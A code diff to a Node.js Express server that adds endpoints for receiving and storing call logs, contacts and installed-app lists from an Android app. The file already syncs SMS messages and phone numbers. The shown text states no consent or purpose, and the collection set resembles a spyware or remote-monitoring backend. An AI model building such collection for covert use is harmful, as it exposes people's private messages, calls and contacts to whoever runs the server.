@@ -80,7 +80,7 @@ async function startServer() {
   // Device registration endpoint (called by Android app on first launch)
   app.post('/api/devices/register', (req, res) => {
     try {
-      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging } = req.body;
+      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id is required' });
 
       const phonesJson = JSON.stringify(phone_numbers || []);
@@ -90,18 +90,22 @@ async function startServer() {
           device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
           app_version = ?, screen_resolution = ?, phone_numbers = ?,
           battery_percent = ?, battery_charging = ?,
+          total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
           is_online = 1, last_seen = datetime('now')
           WHERE device_id = ?`).run(
           device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
-          battery_percent ?? -1, battery_charging ? 1 : 0, device_id
+          battery_percent ?? -1, battery_charging ? 1 : 0,
+          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
+          device_id
         );
       } else {
-        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging)
-          VALUES (?,?,?,?,?,?,?,?,?,?,?)`).run(
+        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram)
+          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
           device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
           app_version || '', screen_resolution || '', phonesJson,
-          battery_percent ?? -1, battery_charging ? 1 : 0
+          battery_percent ?? -1, battery_charging ? 1 : 0,
+          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0
         );
       }
       res.json({ success: true });
@@ -138,6 +142,109 @@ async function startServer() {
       }
 
       console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
+      res.json({ success: true, synced: count });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Call logs sync endpoint — Android app sends call logs here
+  app.post('/api/devices/call-logs', (req, res) => {
+    try {
+      const { device_id, logs } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!Array.isArray(logs)) return res.status(400).json({ error: 'logs must be an array' });
+
+      const insert = db.prepare(`INSERT OR REPLACE INTO call_logs
+        (device_id, call_id, number, name, type, date, duration, synced_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);
+
+      let count = 0;
+      for (const log of logs) {
+        try {
+          insert.run(
+            device_id,
+            log.id || 0,
+            log.number || 'Unknown',
+            log.name || '',
+            log.type || 1,
+            log.date || 0,
+            log.duration || 0
+          );
+          count++;
+        } catch (_) { /* skip errors */ }
+      }
+
+      console.log(`[CALLS] Synced ${count} call logs from device ${device_id}`);
+      res.json({ success: true, synced: count });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Contacts sync endpoint — Android app sends contacts here
+  app.post('/api/devices/contacts', (req, res) => {
+    try {
+      const { device_id, contacts } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be an array' });
+
+      const insert = db.prepare(`INSERT OR REPLACE INTO contacts
+        (device_id, contact_id, name, phones, emails, synced_at)
+        VALUES (?, ?, ?, ?, ?, datetime('now'))`);
+
+      let count = 0;
+      for (const c of contacts) {
+        try {
+          insert.run(
+            device_id,
+            String(c.id || count),
+            c.name || 'Unknown',
+            JSON.stringify(c.phones || []),
+            JSON.stringify(c.emails || [])
+          );
+          count++;
+        } catch (_) { /* skip errors */ }
+      }
+
+      console.log(`[CONTACTS] Synced ${count} contacts from device ${device_id}`);
+      res.json({ success: true, synced: count });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Installed apps sync endpoint — Android app sends app list here
+  app.post('/api/devices/apps', (req, res) => {
+    try {
+      const { device_id, apps } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!Array.isArray(apps)) return res.status(400).json({ error: 'apps must be an array' });
+
+      // Clear old apps for this device and re-insert (full sync)
+      db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(device_id);
+
+      const insert = db.prepare(`INSERT INTO installed_apps
+        (device_id, package_name, app_name, version, install_time, update_time, is_system, synced_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);
+
+      let count = 0;
+      for (const app of apps) {
+        try {
+          insert.run(
+            device_id,
+            app.package_name || '',
+            app.app_name || '',
+            app.version || '',
+            app.install_time || 0,
+            app.update_time || 0,
+            app.is_system ? 1 : 0
+          );
+          count++;
+        } catch (_) { /* skip errors */ }
+      }
+
+      console.log(`[APPS] Synced ${count} apps from device ${device_id}`);
       res.json({ success: true, synced: count });
     } catch (err) {
       res.status(500).json({ error: err.message });
